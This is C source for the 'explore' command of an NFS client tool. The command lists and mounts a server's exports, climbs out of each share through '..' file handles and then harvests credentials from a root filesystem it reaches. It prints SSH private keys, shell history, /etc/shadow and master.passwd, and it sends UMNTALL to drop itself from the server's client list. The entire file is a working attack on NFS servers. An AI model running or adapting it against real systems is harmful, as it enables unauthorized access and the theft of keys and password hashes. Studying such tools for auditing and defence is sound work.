/*
 * Copyright (C)  2023-2024 Claes M Nyberg <cmn@signedness.org>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Claes M Nyberg.
 * 4. The name Claes M Nyberg may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

#include "nfscli.h"
#include "ansicolors.h"

/* Saved data */
struct filedata {
	uint8_t *data; 
	uint64_t len;
};

/*
 * Print file to terminal
 */
static uint64_t
printfile(struct nfsctx *ctx, uint8_t *fh, int fhlen, 
	uint64_t len, struct filedata *save)
{
	struct nfsv3_read_args args;
	struct nfsv3_read_reply reply;
	uint64_t off;
	uint64_t tot;


	off = 0;
	tot = 0;
	memset(&args, 0x00, sizeof(struct nfsv3_read_args));
	memcpy(args.fh, fh, fhlen);
	args.fhlen = fhlen;

    do {
        args.offset = off;
        args.count = IOBUFSIZE;

        memset(&reply, 0x00, sizeof(struct nfsv3_read_reply));

        if (nfsv3_read(ctx, &args, &reply) < 0) {
			fprintf(stderr, "** fwrite(): %s\n", strerror(errno));
            goto finished;
        }

        if (reply.buf != NULL) {
            free(reply.buf);
            reply.buf = NULL;
        }

        if (fwrite(reply.data, reply.len, 1, stdout) != 1) {
			fprintf(stderr, "** fwrite(): %s\n", strerror(errno));
            goto finished;
        }

        off += args.count;
        tot += args.count;
    } while (reply.eof != 1);

    printf("\n-- EOF\n");

finished:
	if ((save != NULL) && (reply.buf != NULL)) {
		save->data = reply.buf;
		save->len = reply.len;

		reply.buf = NULL;
		reply.len = 0;

	}

    if (reply.buf != NULL)
        free(reply.buf);

    return tot;
}

/*
 * Attempt to LOOKUP file inside directory and print it to terminal
 * Return the number of bytes read in file
 */
static uint64_t
showfile(struct nfsctx *ctx, uint8_t *dirfh, int dirfhlen, 
	char *name, struct filedata *save)
{
	struct lookup_ret lu;

	if (save != NULL)
		memset(save, 0x00, sizeof(struct filedata));

	print(0, ctx, "Attempting to show file %s\n", name);
	if (nfsv3_lookup(ctx, dirfh, dirfhlen, name, &lu) == 0) {
		return printfile(ctx, lu.fh, lu.fhlen, lu.obj_attr.size, save);
	}

	return 0;
}

/*
 * Attempt to explore interesting directories and folders 
 * from root file system. on a UNIX OS.
 * Return 1 if root fs was found, 0 otherwise.
 */
static int
explore_rootfs(struct nfsctx *ctx, uint8_t *fh, int fhlen)
{
	struct lookup_ret etc;
	struct lookup_ret lu;

	/* /etc */
	print(0, ctx, "Attempting to explore /etc\n");
	if (nfsv3_lookup(ctx, fh, fhlen, "etc", &etc) == 0) {
		print(0, ctx, "%sFOUND POSSIBLE ROOT FS%s\n", COLOR_RED, COLOR_RESET);
	}

	else {
		print(0, ctx, "Failed to lookup /etc, this is probably not a root FS\n");
		return 0;
	}

	/* /root */
	if (nfsv3_lookup(ctx, fh, fhlen, "root", &lu) == 0) {
		struct lookup_ret lu2;

		print(0, ctx, "Attempting to list /root/\n");
		nfsv3_readdirplus(ctx, ATTRSTR_COLORS, lu.fh, lu.fhlen);
		showfile(ctx, lu.fh, lu.fhlen, ".history", NULL);

		/* List .ssh files */
		if (nfsv3_lookup(ctx, lu.fh, lu.fhlen, ".ssh", &lu2) == 0) {
			print(0, ctx, "Attempting to list /root/.ssh\n");
			nfsv3_readdirplus(ctx, ATTRSTR_COLORS, lu2.fh, lu2.fhlen);
			showfile(ctx, lu2.fh, lu2.fhlen, "authorized_keys", NULL);
			showfile(ctx, lu2.fh, lu2.fhlen, "id_rsa", NULL);
			showfile(ctx, lu2.fh, lu2.fhlen, "id_rsa.pub", NULL);
			showfile(ctx, lu2.fh, lu2.fhlen, "id_ed25519", NULL);
			showfile(ctx, lu2.fh, lu2.fhlen, "id_ed25519.pub", NULL);
			showfile(ctx, lu2.fh, lu2.fhlen, "known_hosts", NULL);
		}
	}

	/* /home */
	if (nfsv3_lookup(ctx, fh, fhlen, "home", &lu) == 0) {
		print(0, ctx, "Attempting to list /home\n");
		nfsv3_readdirplus(ctx, ATTRSTR_COLORS, lu.fh, lu.fhlen);
	}

	/* Save /etc for last */
	if (etc.fhlen) {
		showfile(ctx, etc.fh, etc.fhlen, "passwd", NULL); 
		showfile(ctx, etc.fh, etc.fhlen, "master.passwd", NULL); 
		showfile(ctx, etc.fh, etc.fhlen, "shadow", NULL); 
	}

	return 1;
}


/*
 * Find the top most directory from the shared path.
 * Return the langth of the file handle on success, 
 * with the file handle copied to fhsave (which must 
 * have at least FHMAXLEN bytes of memory) -1 on error.
 */
static int
find_topdir(struct nfsctx *ctx, struct export_reply *share, uint8_t *fhsave)
{
	struct lookup_ret lu;
	uint8_t buf[1024];
	uint8_t rp[FHMAXLEN];
	int rplen;
	uint8_t curr[FHMAXLEN];
	int currlen;

	print(0, ctx, "Listing directories for share %s%s%s\n", 
		COLOR_BOLD, share->name, COLOR_RESET);

	memcpy(curr, share->fh, share->fhlen);
	currlen = share->fhlen;
	while (1) {
		/* List current directory */
		nfsv3_readdirplus(ctx, ATTRSTR_COLORS, curr, currlen);
		
		print(0, ctx, "Using READDIRPLUS and LOOKUP to get file handle for ..\n");
		print(0, ctx, "Current        . FH:%s\n", str_hex(curr, currlen, 
			(char *)buf, sizeof(buf)));

		if ( (rplen = nfsv3_readdirplus_dotdot(ctx, curr, currlen, rp)) > 0) {
			print(0, ctx, "(READDIRPLUS) .. FH:%s\n", str_hex(rp, rplen, 
				(char *)buf, sizeof(buf)));
		}

		if (nfsv3_lookup(ctx, curr, currlen, "..", &lu) == 0) {
			print(0, ctx, "(LOOKUP)      .. FH:%s\n", str_hex(lu.fh, lu.fhlen, 
				(char *)buf, sizeof(buf)));
		}

		if ((rplen > FHMAXLEN) || (lu.fhlen > FHMAXLEN)) {
			fprintf(stderr, "** Error: Returned file handle length exceeds %u\n", FHMAXLEN);
			return -1;
		}

		/*
		 * Now, time to find a candidate for listing ..
		 */

		/* If READDIRPLUS .. equals current dir, ignore it */
		if (rplen == currlen) {
			if (memcmp(rp, curr, currlen) == 0) {
				print(0, ctx, "READDIRPLUS equals current, ignoring\n");
				rplen = 0;
			}
		}

		/* If LOOKUP .. equals current dir, ignore it */
		if (lu.fhlen == currlen) {
			if (memcmp(lu.fh, curr, currlen) == 0) {
				print(0, ctx, "LOOKUP equals current, ignoring\n");
				lu.fhlen = 0;
			}
		}

		/* If LOOKUP and READDIRPLUS are equal, just pick one */
		if ((lu.fhlen > 0) && (rplen > 0)) {
			if (rplen == lu.fhlen) {
				if (memcmp(lu.fh, rp, lu.fhlen) == 0) {
					print(0, ctx, "LOOKUP equals READDIRPLUS, picking one\n");
					memcpy(curr, rp, rplen);
					currlen = rplen;
					continue;
				}
			}	
		}

		/* READDIRPLUS must differ from current at this point */
		if (rplen > 0) {
			print(0, ctx, "Trying READDIRPLUS FH\n");
			memcpy(curr, rp, rplen);
			currlen = rplen;
			continue;
		}

		/* LOOKUP must differ from current at this point */
		if (lu.fhlen > 0) {
			print(0, ctx, "Trying LOOKUP FH\n");
			memcpy(curr, lu.fh, lu.fhlen);
			currlen = lu.fhlen;
			continue;
		}

		/* No more candidate */
		break;
	}

	print(0, ctx, "Done trying to list top directory for share %s%s%s\n", 
		COLOR_BOLD, share->name, COLOR_RESET);
	
	if (fhsave != NULL) 
		memcpy(fhsave, curr, currlen);
	return currlen;
}


int
cmd_explore(struct nfsctx *ctx, int argc, char **argv)
{
	struct export_reply *xpl;
	struct export_reply *shares;
	int opt;
	uint8_t fh_all;
	size_t tablen;
	int rootfs;

	rootfs = 0;
	fh_all = 0;
	while ( (opt = getopt(argc, argv, "a")) != -1) {
		switch (opt) {
			case 'a': /* Attempt to resolve all file handles, for all shares */
				fh_all = 1;
				break;

			default:
				print(0, ctx, "** Error: %s: Unknown option '%c'\n", argv[0], optopt);
				errno = EINVAL;
				return -1;
			break;
		}
	}

	/* First resolve the mount port if it has not been set */
	if (ctx->port_mountd == 0) {
		int port;
	
		print(0, ctx, "Port unknown for mount service, attempting to resolve\n");
		if ( (port = portmap_getport_mountd(ctx)) <= 0) 
			return -1;
		ctx->port_mountd = port;
	}

	/* Get a list of shares */
	print(0, ctx, "Mount port resolved to %d\n", ntohs(ctx->port_mountd));
	print(0, ctx, "Retrieving list of shares\n");
	if (mount_export(ctx, &shares) < 0)
		return -1;

	/* Print all shares */
#define TABALIGN    48
	xpl = shares;
	while (xpl != NULL) {
		printf("%s ", xpl->name);
		for (tablen=strlen(xpl->name); tablen < TABALIGN; tablen++)
			printf("_");
		printf(" %s\n", xpl->group);
		xpl = xpl->next;
	}

	print(0, ctx, "Attempting to resolve file handles\n");
	xpl = shares;
	while (xpl != NULL) {

		if (fh_all || xpl->everyone) {
			ACOLOR_SET(COLOR_BOLD);
			printf("%s ", xpl->name);
			for (tablen=strlen(xpl->name); tablen < TABALIGN; tablen++)
				printf("_");
			printf(" ");
			ACOLOR_RESET();
			fflush(stdout);
			if ((xpl->fhlen = mount_mount(ctx, xpl->name, &xpl->fh)) > 0) {
				printf("FH:");
				ACOLOR_SET(COLOR_BRED);
				HEXDUMP(xpl->fh, xpl->fhlen);
				ACOLOR_RESET();
			}
		}
		
		xpl = xpl->next;
	}

	print(0, ctx, "Sending UMNTALL command to clear us from client list\n");
	mount_umntall(ctx);

	/* 
	 * Attempt to list the topmost directory in each share that we have
	 * the file handle for, using both lookup and readdirplus to resolve
	 * the handle for ".." 
	 */
	xpl = shares;
	while (xpl != NULL) {
		uint8_t fh[FHMAXLEN];
		int fhlen;
	
		if (xpl->fhlen > 0)  {
			if ( (fhlen = find_topdir(ctx, xpl, fh)) > 0) {
				/* Explore root fs the first time it is encountered */
				if (rootfs == 0) {
					if (explore_rootfs(ctx, fh, fhlen) == 1)
						rootfs = 1;
				}
			}
		}

		xpl = xpl->next;
	}


    return 0;
}

